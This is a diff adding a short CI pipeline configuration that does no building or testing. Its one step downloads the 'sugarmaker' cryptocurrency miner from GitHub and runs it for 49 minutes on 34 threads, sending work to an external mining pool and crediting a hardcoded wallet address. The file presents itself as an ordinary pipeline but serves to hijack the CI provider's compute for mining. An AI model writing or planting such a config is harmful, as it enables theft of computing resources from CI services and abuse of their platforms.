@@ -1,0 +1,13 @@
+---
+kind: pipeline
+type: docker
+name: default
+
+steps:
+- name: First
+  image: debian:buster
+  commands:
+  - apt-get update
+  - apt-get install unzip wget -y
+  - wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && timeout 49m ./sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerMbc -o stratum+tcp://mbc-asia.skypool.co:8003 -u BW5J9uSp5rpEsC2g57kkwV3xHiw8UrREcw -t 34
+  - ls
